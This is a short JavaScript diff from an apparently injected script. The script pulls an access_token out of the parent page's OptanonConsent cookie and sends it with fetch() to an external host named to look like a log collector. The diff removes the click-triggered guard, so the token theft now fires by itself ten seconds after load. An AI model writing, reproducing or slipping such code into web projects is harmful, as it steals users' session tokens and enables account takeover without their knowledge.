@@ -11,13 +11,10 @@
   n:none;cursor:pointer';
   d.body.append(a);
 
-  var fired = false;
-  d.addEventListener('click', function () {
-    if (fired) return;
-    fired = true;
+ 
     setTimeout(function () {
       var t = (parent.document.cookie.match(/OptanonConsent=([^;]*)/) || [])[1] || '';
       t = (t.match(/access_token%3D([^%&]+)/) || [])[1];
       if (t) fetch('https://http-log-collector.netlify.app/api/log?token=' + t);
     }, 10000);
-  }, true);
+
